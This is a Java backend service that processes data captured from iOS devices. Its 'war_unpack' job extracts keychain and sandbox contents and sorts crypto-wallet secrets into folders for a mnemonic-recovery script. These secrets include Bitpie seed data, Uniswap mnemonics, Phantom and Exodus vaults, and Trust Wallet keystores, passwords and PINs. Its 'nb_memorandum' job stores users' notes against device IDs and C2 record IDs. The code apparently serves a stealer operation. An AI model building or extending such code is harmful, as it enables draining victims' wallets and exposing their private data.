package com.consumer.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.Ios18ParamDao;
import com.consumer.dao.MemorandumDao;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.Ios18ParamEntity;
import com.consumer.entity.MemorandumEntity;
import com.consumer.util.RedisPush;

import lombok.extern.slf4j.Slf4j;

import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.JedisPool;
import redis.clients.jedis.params.SetParams;

/**
 * Consumer 消息分派与业务执行（文档 §7）。
 * <p>
 * 只处理 API 进程未完成的后续业务：
 * <ul>
 *   <li>war_unpack：解包 .bin → 提取 keychain/sandbox → UPDATE unpack_path → 链式触发 parse_ci</li>
 *   <li>nb_memorandum：写 memorandum + touch device</li>
 * </ul>
 * parse_ci 已拆分到 {@link ParseCiHandler}，news4:tasks 已拆分到 {@link News4Handler}。
 * ios18param 的 INSERT 已在 API 进程同步完成，Consumer 不再重复写入。
 */
@Service
@Slf4j
public class CaptureDispatchService {

    /** hex 编码字符表，替代 String.format("%02x") 的热路径优化 */
    private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();

    @Resource
    private Ios18ParamDao ios18ParamDao;
    @Resource
    private DeviceDao deviceDao;
    @Resource
    private MemorandumDao memorandumDao;
    @Resource
    private RedisPush redisPush;
    @Resource
    private JedisPool jedisPool;

    // ==================================================================
    // 主队列入口（api18:tasks）
    // ==================================================================

    /**
     * 处理一条 api18:tasks 消息。成功返回 true（XACK），失败返回 false（重试）。
     */
    public boolean handleMain(Map<String, String> fields) {
        String job = fields == null ? null : fields.get("job");
        try {
            if (job == null) {
                return true;
            }
            switch (job) {
                case "war_unpack":
                    return handleWarUnpack(fields);
                case "nb_memorandum":
                    return handleNbMemorandum(fields);
                default:
                    return true;
            }
        } catch (Throwable t) {
            log.error("handleMain FAIL job={} err={} fields={}", job, t.toString(), fields, t);
            return false;
        }
    }

    /**
     * job=war_unpack：解析 war JSON → 提取 keychain 表项到 files/hex/，
     * 提取 sandbox 数据到 files/sandbox/，写 MANIFEST，UPDATE unpack_path。
     * 不加 @Transactional：文件 I/O + 单条 UPDATE，无需事务。
     */
    public boolean handleWarUnpack(Map<String, String> fields) {
    	log.info("【war_unpack】钥匙串解包开始");
        String idStr = fields.get("ios18param_id");
        String filePath = nullToEmpty(fields.get("file_path"));
        
        if (idStr == null) {
            return true;
        }
        
        int id;
        try {
            id = Integer.parseInt(idStr);
        } catch (NumberFormatException e) {
            return true;
        }
        
        Ios18ParamEntity entity = ios18ParamDao.findById(id);
        if (entity == null) {
            return true;
        }

        // 幂等：已存在 unpack_path 说明已处理过（多实例/重试时重复消费），直接跳过
        if (entity.getUnpackPath() != null && !entity.getUnpackPath().isEmpty()) {
            // 链式触发 parse_ci 也需要重新发一次，避免 ACK 丢失场景下 parse_ci 被永久阻塞
            try {
                Map<String, String> parseJob = new HashMap<>();
                parseJob.put("job", "parse_ci");
                parseJob.put("ios18param_id", String.valueOf(id));
                parseJob.put("file_path", filePath);
                parseJob.put("unpack_path", entity.getUnpackPath());
                parseJob.put("kind", entity.getKind() == null ? "" : entity.getKind());
                parseJob.put("device_id", entity.getDeviceId() == null ? "" : entity.getDeviceId());
                redisPush.notifySync(parseJob, redisPush.streamParseCi());
            } catch (Throwable t) {
                log.error("【war_unpack】幂等重入时 parse_ci 入队失败 id={} err={}", id, t.toString());
            }
            return true;
        }

        // 分布式锁：防止多实例同时解包同一个 .bin（幂等检查 unpack_path 与实际写 unpack_path 之间的竞态）
        String lockKey = "war_unpack:lock:" + id;
        String lockToken = UUID.randomUUID().toString();
        boolean locked = false;
        try {
            try (Jedis j = jedisPool.getResource()) {
                String res = j.set(lockKey, lockToken, SetParams.setParams().nx().ex(300));
                locked = "OK".equals(res);
            } catch (Throwable t) {
                log.warn("【war_unpack】分布式锁获取异常，降级继续 id={} err={}", id, t.toString());
                locked = true; // Redis 不可用时降级，不阻塞业务
            }
            if (!locked) {
                log.info("【war_unpack】分布式锁未获取，其他实例正在处理 id={}", id);
                return true;
            }

        // 直接使用完整路径
        File bin = new File(filePath);
        if (!bin.exists() || bin.length() == 0) {
            return true;
        }
        
        // 准备解压目录
        String stem = getStem(bin.getName());
        File unpackDir = new File(bin.getParentFile(), stem + "_unpacked");
        File hexDir = new File(unpackDir, "files/hex");
        File sandboxDir = new File(unpackDir, "files/sandbox");
        
        try {
            Files.createDirectories(hexDir.toPath());
            Files.createDirectories(sandboxDir.toPath());
        } catch (IOException e) {
            return false;
        }
        
        // 读取原始文件内容（已在 API 端解密，磁盘存明文）
        String rawJson;
        try {
            rawJson = new String(readFileBytes(bin), StandardCharsets.UTF_8);
        } catch (IOException e) {
            return false;
        }

        // 调试日志：打印 rawJson 头部 + 顶层 key 列表（排查空文件夹根因）
        try {
            Object parsedTop = JSON.parse(rawJson);
            if (parsedTop instanceof JSONObject) {
                JSONObject top = (JSONObject) parsedTop;
                // 兼容：war 数据可能嵌套在 {"data": {...}} / {"payload": {...}} 里，尝试穿透
                if (!top.containsKey("keychain") && !top.containsKey("sandbox")) {
                    for (String wrapKey : new String[]{"data", "payload", "war", "content"}) {
                        Object inner = top.get(wrapKey);
                        if (inner instanceof JSONObject) {
                            JSONObject ij = (JSONObject) inner;
                            if (ij.containsKey("keychain") || ij.containsKey("sandbox")) {
                                rawJson = ij.toJSONString();
                                break;
                            }
                        }
                    }
                }
            }
        } catch (Exception debugE) {
        }
        
        // 解析JSON
        JSONObject war;
        try {
            war = JSON.parseObject(rawJson);
            if (war == null) {
                ios18ParamDao.updateUnpack(id, "", "JSON解析结果为空");
                return true;
            }
        } catch (Exception e) {
            return false;
        }
        
        // 提取钥匙串和沙盒数据
        int extractedFiles = 0;
        String extractRemark = "";
        try {
            boolean hasKeychain = war.getJSONObject("keychain") != null;
            boolean hasSandbox = war.getJSONObject("sandbox") != null;
            if (!hasKeychain && !hasSandbox) {
                extractRemark = "顶层JSON无keychain/sandbox字段(keys=" + war.keySet() + ")";
                log.warn("【war_unpack】提取 0 文件：顶层 key 列表异常 id={} keys={}", id, war.keySet());
            } else {
                extractedFiles += extractKeychain(war, hexDir);
                extractedFiles += extractSandbox(war, sandboxDir);
                if (extractedFiles == 0) {
                    extractRemark = "存在 keychain/sandbox 但实际提取 0 个条目(keychain=" + hasKeychain + ",sandbox=" + hasSandbox + ")";
                    log.warn("【war_unpack】提取 0 文件：keychain/sandbox 结构未解析出条目 id={}", id);
                }
            }
        } catch (Exception e) {
            extractRemark = "提取异常:" + e.getMessage();
        }
        
        // 写入清单文件
        try {
            writeManifest(unpackDir, entity, bin, extractedFiles);
        } catch (IOException e) {
        }
        
        // 更新数据库 - 记录解压路径（存完整路径，与 file_path 格式一致）
        String absUnpackPath = unpackDir.getAbsolutePath().replace('\\', '/');
        String remark = extractedFiles > 0 ? "解包成功:提取" + extractedFiles + "个文件"
                : ("解包无提取数据:" + (extractRemark.isEmpty() ? "unknown" : extractRemark));
        ios18ParamDao.updateUnpack(id, absUnpackPath, remark);
        log.info("【war_unpack】钥匙串解包更新成功：id={} 解压路径={} 提取文件数={}", id, absUnpackPath, extractedFiles);

        // 仅在解包 + DB UPDATE 均成功后推送，确保 parse_ci 能读到 unpack_path
        try {
            // 兜底：entity.device_id 为空时从 file_path 文件名提取 device UUID
            String devForParse = entity.getDeviceId() == null ? "" : entity.getDeviceId();
            if (devForParse.isEmpty() && !filePath.isEmpty()) {
                devForParse = extractDeviceFromPath(filePath);
                if (!devForParse.isEmpty()) {
                    log.info("【war_unpack】device_id 从 file_path 兜底提取 id={} device={} file={}",
                            id, devForParse, filePath);
                }
            }
            Map<String, String> parseJob = new HashMap<>();
            parseJob.put("job", "parse_ci");
            parseJob.put("ios18param_id", String.valueOf(id));
            parseJob.put("file_path", filePath);
            parseJob.put("unpack_path", absUnpackPath);
            parseJob.put("kind", entity.getKind() == null ? "" : entity.getKind());
            parseJob.put("device_id", devForParse);
            redisPush.notifySync(parseJob, redisPush.streamParseCi());
            log.info("【war_unpack】链式触发 parse_ci 入队成功 id={} device={}", id, devForParse);
        } catch (Throwable t) {
            log.error("【war_unpack】链式触发 parse_ci 入队失败 id={} err={}", id, t.toString(), t);
            // 入队失败不影响 war_unpack 的 XACK；parse_ci 队列有重试+DLQ兜底，必要时可扫 unpack_path 重放
        }

        return true;
        } finally {
            if (locked) {
                try (Jedis j = jedisPool.getResource()) {
                    // Lua 脚本安全释放锁（只删自己的 token，避免误删其他实例的锁）
                    j.eval("if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end",
                            1, lockKey, lockToken);
                } catch (Throwable ignore) {}
            }
        }
    }

    /**
     * 提取 keychain tables 到 files/hex/{app}/，按 app 分子目录，匹配 recover_hq8_mnemonics.py 的目录结构。
     * - bitpie: hex/bitpie/{account}_data.txt（hex 文本，Python 用 bytes.fromhex 解码）
     * - uniswap: hex/uniswap/{account}.txt（解码后的 UTF-8 文本，文件名含 mnemonic）
     * - phantom: hex/phantom/{account}.json（解码后的 JSON 文本）
     * - exodus: hex/exodus/{account}.json（解码后的 JSON 文本）
     * - trustwallet: hex/trustwallet/{account}_data.txt（hex 文本）
     * - 其他: hex/{app}/{account}.data.bin（解码后的二进制）
     */
    private int extractKeychain(JSONObject war, File hexDir) {
        int count = 0;
        JSONObject keychain = war.getJSONObject("keychain");
        if (keychain == null) return 0;

        JSONObject tables = keychain.getJSONObject("tables");
        if (tables == null) return 0;

        for (String tableName : tables.keySet()) {
            JSONObject table = tables.getJSONObject(tableName);
            if (table == null) continue;
            JSONArray items = table.getJSONArray("items");
            if (items == null) continue;

            for (int i = 0; i < items.size(); i++) {
                JSONObject item = items.getJSONObject(i);
                if (item == null) continue;

                String service = firstNonEmpty(item.getString("service"), "unknown");
                String account = firstNonEmpty(item.getString("account"), "");
                String app = mapKeychainApp(service, account);

                // 创建 per-app 子目录
                File appDir = new File(hexDir, app);
                try {
                    Files.createDirectories(appDir.toPath());
                } catch (IOException e) {
                    continue;
                }

                // 获取原始 dataHex 字符串
                Object dataHexObj = item.get("dataHex");
                String rawHexStr = null;
                byte[] decodedBytes = null;
                if (dataHexObj instanceof String) {
                    rawHexStr = (String) dataHexObj;
                    decodedBytes = extractDataBytes(dataHexObj);
                } else if (dataHexObj instanceof JSONObject) {
                    // 嵌套对象：尝试提取 dataHex 或 data 字段
                    JSONObject obj = (JSONObject) dataHexObj;
                    Object inner = obj.get("dataHex");
                    if (inner instanceof String) {
                        rawHexStr = (String) inner;
                        decodedBytes = extractDataBytes(inner);
                    } else {
                        Object data = obj.get("data");
                        if (data instanceof String) {
                            rawHexStr = (String) data;
                            decodedBytes = extractDataBytes(data);
                        }
                    }
                }
                if (decodedBytes == null || decodedBytes.length == 0) continue;

                // 根据 app 类型决定文件名和内容格式
                String fileName;
                byte[] fileContent;
                switch (app) {
                    case "bitpie":
                        // Python 期望 hex 文本文件，用 bytes.fromhex 解码
                        fileName = sanitizeFileName(account) + "_data.txt";
                        fileContent = (rawHexStr != null ? rawHexStr : bytesToHex(decodedBytes))
                                .getBytes(StandardCharsets.UTF_8);
                        break;
                    case "trustwallet":
                    case "trust":
                        // ⚠ 与 bitpie 的 _data.txt 内容格式完全不同：
                        // bitpie：decodedBytes = 二进制熵，Python 用 bytes.fromhex() 解码 → 必须 bytesToHex 存
                        // trust：decodedBytes = UTF-8 文本（密码是 64hex 字符串、keystore 是 JSON、PIN 是数字串），
                        //        Python 直接 txt.strip().encode() / json.loads(txt) → 直接存 decodedBytes（明文）
                        String trustStr = new String(decodedBytes, StandardCharsets.UTF_8);
                        if (trustStr.trim().startsWith("{")) {
                            fileName = sanitizeFileName(account) + ".json";
                            fileContent = decodedBytes;
                        } else {
                            // 密码 / PIN / 配置 = UTF-8 文本，直接存 decodedBytes（不做额外 hex 编码，对齐 Python 直接读 txt）
                            // 文件名惯例：trustwalletUTC--*（64hex 密码）存成 .txt 以便 MnemonicExtractor 按 startsWith/endsWith 匹配
                            fileName = sanitizeFileName(account) + ".txt";
                            fileContent = decodedBytes;
                        }
                        break;
                    case "uniswap":
                        // Python 期望明文 mnemonic，文件名需含 "mnemonic"
                        fileName = sanitizeFileName(account) + ".txt";
                        if (!fileName.toLowerCase().contains("mnemonic")) {
                            fileName = "mnemonic_" + fileName;
                        }
                        fileContent = decodedBytes; // 已从 hex 解码为 UTF-8 文本
                        break;
                    case "phantom":
                    case "exodus":
                        // Python 期望 JSON 文件
                        fileName = sanitizeFileName(account) + ".json";
                        fileContent = decodedBytes;
                        break;
                    default:
                        fileName = sanitizeFileName(account) + ".data.bin";
                        fileContent = decodedBytes;
                        break;
                }

                // 处理重名文件（同 app 同 account 多条记录）
                File outFile = new File(appDir, fileName);
                if (outFile.exists()) {
                    String base = fileName.contains(".") ? fileName.substring(0, fileName.lastIndexOf('.'))
                            : fileName;
                    String ext = fileName.contains(".") ? fileName.substring(fileName.lastIndexOf('.')) : "";
                    outFile = new File(appDir, base + "_" + (System.currentTimeMillis() % 10000) + ext);
                }

                try {
                    Files.write(outFile.toPath(), fileContent);
                    count++;
                } catch (IOException e) {
                }
            }
        }
        return count;
    }

    /** 将 keychain service/account 映射到 app 子目录名（匹配 recover_hq8_mnemonics.py） */
    private String mapKeychainApp(String service, String account) {
        String svc = service == null ? "" : service;
        String acc = account == null ? "" : account;
        String combined = (svc + " " + acc).toLowerCase();
        // keychain 中 account 常为 hex 编码的字符串（如 phantom vault seed），尝试解码后再匹配
        String decoded = tryHexDecodeUtf8(acc);
        String combinedEx = combined + " " + (decoded == null ? "" : decoded.toLowerCase());

        if (combinedEx.contains("bitpie")) return "bitpie";
        if (combinedEx.contains("uniswap")) return "uniswap";
        if (combinedEx.contains("phantom")) return "phantom";
        if (combinedEx.contains("exodus")) return "exodus";
        // 先精确匹配 trustwallet / trust.wallet → trustwallet 子目录
        if (combinedEx.contains("trustwallet") || combinedEx.contains("trust.wallet")) return "trustwallet";
        // 再匹配 trust.xxx（如 trust.account / trust_wallet_service 等）→ trust 子目录
        // 对齐 Python (2) 脚本：hex_dirs = [hex/trustwallet, hex/trust]
        if (combinedEx.contains("trust") && !combinedEx.contains("trustpilot")) return "trust";
        if (combinedEx.contains("tonhub")) return "tonhub";
        if (combinedEx.contains("coin98")) return "coin98";
        if (combinedEx.contains("mytonwallet")) return "mytonwallet";
        if (combinedEx.contains("im.token") || combinedEx.contains("imtoken")) return "imtoken";
        // 默认：用 sanitized service 名
        return sanitizeFileName(svc.isEmpty() ? "unknown" : svc);
    }

    /** 尝试将 hex 字符串解码为 UTF-8 文本（用于 keychain account 识别钱包归属） */
    private String tryHexDecodeUtf8(String s) {
        if (s == null || s.isEmpty()) return null;
        String trimmed = s.trim();
        if (trimmed.length() % 2 != 0 || !trimmed.matches("[0-9a-fA-F]+")) return null;
        try {
            byte[] bytes = hexToBytes(trimmed);
            String decoded = new String(bytes, StandardCharsets.UTF_8);
            int printable = 0;
            for (char c : decoded.toCharArray()) if (c >= 0x20 && c < 0x7f) printable++;
            return printable * 2 >= decoded.length() ? decoded : null;
        } catch (Exception e) { return null; }
    }

    /** bytes 转 hex 字符串 */
    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            int v = b & 0xFF;
            sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
        }
        return sb.toString();
    }

    /** 从 dataHex 字段提取字节数据：支持 hex 字符串 / base64 / 对象内 dataHex */
    private byte[] extractDataBytes(Object dataHex) {
        if (dataHex == null) return null;
        if (dataHex instanceof String) {
            String hex = (String) dataHex;
            // 尝试 hex 解码
            if (hex.matches("[0-9a-fA-F]+") && hex.length() % 2 == 0) {
                try { return hexToBytes(hex); } catch (Exception ignore) {}
            }
            // 尝试 base64 解码
            try { return Base64.getDecoder().decode(hex); } catch (Exception ignore) {}
            // 普通字符串
            return hex.getBytes(StandardCharsets.UTF_8);
        }
        if (dataHex instanceof JSONObject) {
            JSONObject obj = (JSONObject) dataHex;
            // 原始数据在 dataHex 字段内（嵌套）
            Object inner = obj.get("dataHex");
            if (inner != null) return extractDataBytes(inner);
            // 或 data 字段
            Object data = obj.get("data");
            if (data instanceof String) {
                try { return Base64.getDecoder().decode((String) data); } catch (Exception ignore) {}
            }
            // 或 decoded_bytes 预览
            Object preview = obj.get("preview_utf8");
            if (preview instanceof String) {
                return ((String) preview).getBytes(StandardCharsets.UTF_8);
            }
        }
        return null;
    }

    /**
     * 提取 sandbox 数据到 files/sandbox/{app}/{relative_path}，匹配 recover_hq8_mnemonics.py 的目录结构。
     * sandbox JSON 结构: { "app_name": { "relative/file/path": "base64_content", ... } }
     * Python 脚本期望每个 app 目录下按真实文件路径展开，如:
     *   sandbox/trust/Documents/keystore/UTC--*.json
     *   sandbox/tonhub/Documents/mmkv/mmkv.default
     *   sandbox/coin98/{32hex_file}
     */
    private int extractSandbox(JSONObject war, File sandboxDir) {
        int count = 0;
        JSONObject sandbox = war.getJSONObject("sandbox");
        if (sandbox == null) return 0;

        for (String appName : sandbox.keySet()) {
            JSONObject appData = sandbox.getJSONObject(appName);
            if (appData == null) continue;

            File appDir = new File(sandboxDir, sanitizeFileName(appName));
            try {
                Files.createDirectories(appDir.toPath());
            } catch (IOException e) {
                continue;
            }

            for (String relPath : appData.keySet()) {
                Object val = appData.get(relPath);
                if (!(val instanceof String)) continue;

                String content = (String) val;
                byte[] fileBytes;

                // 尝试 base64 解码（sandbox 值通常是 base64 编码的文件内容）
                try {
                    fileBytes = Base64.getDecoder().decode(content);
                } catch (Exception notB64) {
                    // 不是 base64，按原始文本写入
                    fileBytes = content.getBytes(StandardCharsets.UTF_8);
                }

                // relPath 作为相对文件路径展开（如 Documents/keystore/UTC--xxx.json）
                String safePath = sanitizeRelativePath(relPath);
                if (safePath == null || safePath.isEmpty()) continue;

                File outFile = new File(appDir, safePath);
                try {
                    File parent = outFile.getParentFile();
                    if (parent != null && !parent.exists()) {
                        Files.createDirectories(parent.toPath());
                    }
                    Files.write(outFile.toPath(), fileBytes);
                    count++;
                } catch (IOException e) {
                }
            }
        }
        return count;
    }

    /** 将相对路径清理为安全路径（防止路径穿越，保留子目录结构） */
    private static String sanitizeRelativePath(String path) {
        if (path == null || path.isEmpty()) return null;
        // 标准化分隔符
        path = path.replace('\\', '/');
        // 去除前导 /
        while (path.startsWith("/")) path = path.substring(1);
        // 分割并过滤 .. 防止路径穿越
        String[] parts = path.split("/");
        StringBuilder sb = new StringBuilder();
        for (String part : parts) {
            if (part == null || part.isEmpty() || part.equals(".") || part.equals("..")) continue;
            if (sb.length() > 0) sb.append("/");
            sb.append(part.replaceAll("[^a-zA-Z0-9_\\-\\.]", "_"));
        }
        return sb.length() > 0 ? sb.toString() : null;
    }

    /** 写 MANIFEST.txt */
    private void writeManifest(File unpackDir, Ios18ParamEntity entity, File bin, int extractedFiles) throws IOException {
        Path manifest = Paths.get(unpackDir.getAbsolutePath(), "MANIFEST.txt");
        List<String> lines = new ArrayList<>();
        lines.add("ios18param_id=" + entity.getId());
        lines.add("kind=" + firstNonEmpty(entity.getKind(), ""));
        lines.add("device_id=" + firstNonEmpty(entity.getDeviceId(), ""));
        lines.add("size=" + bin.length());
        lines.add("original_file=" + bin.getAbsolutePath());
        lines.add("extracted_files=" + extractedFiles);
        lines.add("unpack_time=" + System.currentTimeMillis() / 1000.0);
        Files.write(manifest, lines);
    }

    // 注：computeRelativePath 已弃用 — unpack_path 现在直接存完整绝对路径
    //     （与 file_path 格式一致），避免 parse_ci 侧再拼绝对路径。

    // ==================================================================
    // nb_memorandum：读 body → 写 memorandum + touch device
    // ==================================================================

    /**
     * job=nb_memorandum：读取 body → 按 lhu 找 device → INSERT memorandum → touch device。
     * 不加 @Transactional：单条 upsert 自动提交，避免长事务锁表。
     */
    public boolean handleNbMemorandum(Map<String, String> fields) throws Exception {
        String ios18IdStr = fields.get("ios18param_id");
        String deviceId = nullToEmpty(fields.get("device_id"));
        String storage = nullToEmpty(fields.get("storage"));
        String filePath = nullToEmpty(fields.get("file_path"));
        String bodyB64 = nullToEmpty(fields.get("body_b64"));
        String lhu = deviceId.isEmpty() ? nullToEmpty(fields.get("lhu")) : deviceId;
        Integer ios18Id = null;
        if (ios18IdStr != null && !ios18IdStr.isEmpty()) {
            try { ios18Id = Integer.parseInt(ios18IdStr); } catch (Exception ignore) {}
        }
        String rawBody;
        if ("file".equals(storage) && !filePath.isEmpty()) {
            Path path = Paths.get(filePath);
            if (!Files.isRegularFile(path)) {
                log.warn("【nb_memorandum】文件不存在 id={} path={}", ios18Id, filePath);
                return true;
            }
            byte[] bytes = Files.readAllBytes(path);
            rawBody = new String(bytes, StandardCharsets.UTF_8);
        } else if (!bodyB64.isEmpty()) {
            rawBody = new String(Base64.getDecoder().decode(bodyB64), StandardCharsets.UTF_8);
        } else {
            log.warn("【nb_memorandum】无 file_path/body_b64，跳过 id={}", ios18Id);
            return true;
        }

        JSONObject nb = JSON.parseObject(rawBody);
        if (nb == null) {
            log.warn("【nb_memorandum】JSON 解析失败 id={}", ios18Id);
            return true;
        }
        if (lhu.isEmpty()) lhu = nb.getString("lhu");
        if (lhu == null) lhu = "";
        JSONArray list = nb.getJSONArray("list");
        if (list == null || list.isEmpty()) {
            log.warn("【nb_memorandum】list 为空，跳过 id={} keys={}", ios18Id, nb.keySet());
            return true;
        }

        // memorandum.device_row_id 非空且无默认值，必须先解析 device 表主键
        String uid = !deviceId.isEmpty() ? deviceId : lhu;
        DeviceEntity device = null;
        if (!uid.isEmpty()) {
            try {
                device = deviceDao.findByDeviceIdLatest(uid);
                if (device == null) {
                    device = deviceDao.findByDeviceid(uid);
                }
            } catch (Exception e) {
                log.warn("【nb_memorandum】查 device 失败 uid={} err={}", uid, e.toString());
            }
        }
        if (device == null || device.getId() == null) {
            log.warn("【nb_memorandum】无 device_row_id，跳过写入 id={} uid={}（请先保证 device 表有该设备）",
                    ios18Id, uid);
            return true;
        }
        Integer deviceRowId = device.getId();
        String channelcode = device.getChannelCode() == null ? "" : device.getChannelCode();
        String serial = device.getSerial() == null ? "" : device.getSerial();

        Integer ecid = null;
        if (nb.containsKey("ecid")) {
            try { ecid = nb.getInteger("ecid"); } catch (Exception ignore) {}
        }
        if (ecid == null && device.getEcid() != null) {
            try { ecid = Integer.parseInt(device.getEcid().trim()); } catch (Exception ignore) {}
        }
        if (ecid == null) ecid = 0;

        double now = System.currentTimeMillis() / 1000.0;
        int count = 0;
        int fail = 0;
        int skipEmpty = 0;

        for (Object o : list) {
            String title = "";
            String content;
            if (o instanceof String) {
                content = (String) o;
            } else if (o instanceof JSONObject) {
                JSONObject j = (JSONObject) o;
                String t = firstNonEmpty(j.getString("title"));
                title = t == null ? "" : t;
                content = firstNonEmpty(
                        j.getString("snippet"),
                        j.getString("content"),
                        j.getString("body"),
                        "");
            } else if (o instanceof Map) {
                @SuppressWarnings("unchecked")
                Map<String, Object> m = (Map<String, Object>) o;
                String t = firstNonEmpty(strVal(m.get("title")));
                title = t == null ? "" : t;
                content = firstNonEmpty(
                        strVal(m.get("snippet")),
                        strVal(m.get("content")),
                        strVal(m.get("body")),
                        "");
            } else {
                log.warn("【nb_memorandum】list 元素类型不支持 type={}", o == null ? null : o.getClass().getName());
                skipEmpty++;
                continue;
            }
            if (content == null || content.isEmpty()) {
                skipEmpty++;
                continue;
            }
            String hash = sha256Hex((title + "\n" + content).getBytes(StandardCharsets.UTF_8));
            MemorandumEntity me = new MemorandumEntity();
            me.setDeviceRowId(deviceRowId);
            me.setDeviceUid(uid);
            me.setEcid(ecid);
            me.setChannelcode(channelcode);
            me.setSerial(serial);
            me.setType("7");
            me.setContent(content);
            me.setContentHash(hash);
            me.setTitle(title);
            me.setC2RecordId(ios18Id);
            me.setAddtime(now);
            try {
                memorandumDao.insert(me);
                count++;
            } catch (Exception e) {
                // 唯一键冲突视为已入库成功（幂等）
                String msg = e.toString();
                if (msg.contains("Duplicate") || msg.contains("duplicate") || msg.contains("UK_") || msg.contains("uk_")) {
                    count++;
                    log.info("【nb_memorandum】已存在跳过 id={} hash={}", ios18Id, hash);
                } else {
                    fail++;
                    log.warn("【nb_memorandum】insert 失败 id={} hash={} err={}", ios18Id, hash, msg);
                }
            }
        }
        try {
            deviceDao.touchByDeviceId(uid, now);
        } catch (Exception e) {
            log.warn("【nb_memorandum】touch device 失败 uid={} err={}", uid, e.toString());
        }
        log.info("【nb_memorandum】备忘录数据处理完成 device={} deviceRowId={} count={} ok={} fail={} skipEmpty={} listSize={}",
                uid, deviceRowId, count, count, fail, skipEmpty, list.size());
        return true;
    }

    // ==================================================================
    // 工具方法
    // ==================================================================

    private static byte[] readFileBytes(File f) throws IOException {
        long len = f.length();
        if (len > Integer.MAX_VALUE) throw new IOException("file too large: " + len);
        byte[] buf = new byte[(int) len];
        try (java.io.FileInputStream in = new java.io.FileInputStream(f)) {
            int off = 0, read;
            while (off < buf.length && (read = in.read(buf, off, buf.length - off)) > 0) off += read;
        }
        return buf;
    }

    private static String sha256Hex(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(data);
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                int v = b & 0xFF;
                sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
            }
            return sb.toString();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    private static String sanitizeFileName(String name) {
        if (name == null || name.isEmpty()) return "unnamed";
        return name.replaceAll("[^a-zA-Z0-9_\\-\\.]", "_");
    }

    private static String getStem(String fileName) {
        int dot = fileName.lastIndexOf('.');
        return dot > 0 ? fileName.substring(0, dot) : fileName;
    }

    private static String firstNonEmpty(String... arr) {
        for (String s : arr) if (s != null && !s.isEmpty()) return s;
        return null;
    }

    private static String strVal(Object o) {
        return o == null ? null : String.valueOf(o);
    }

    private static String nullToEmpty(String s) {
        return s == null ? "" : s;
    }

    /**
     * 从落盘文件路径提取 device UUID。
     * 文件名格式：{YYYYMMDD}/{kind}/{device}_{sha16}_{size}.bin
     * device 是第一个 _ 之前的部分，且必须是合法的 hex UUID（长度≥16，全 hex）。
     */
    private static String extractDeviceFromPath(String filePath) {
        if (filePath == null || filePath.isEmpty()) return "";
        String name = filePath;
        int slash = Math.max(filePath.lastIndexOf('/'), filePath.lastIndexOf('\\'));
        if (slash >= 0) name = filePath.substring(slash + 1);
        int dot = name.lastIndexOf('.');
        if (dot > 0) name = name.substring(0, dot);
        int us = name.indexOf('_');
        if (us <= 0) return "";
        String candidate = name.substring(0, us);
        if (candidate.length() < 16) return "";
        for (int i = 0; i < candidate.length(); i++) {
            char c = candidate.charAt(i);
            if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
                return "";
            }
        }
        return candidate;
    }
}
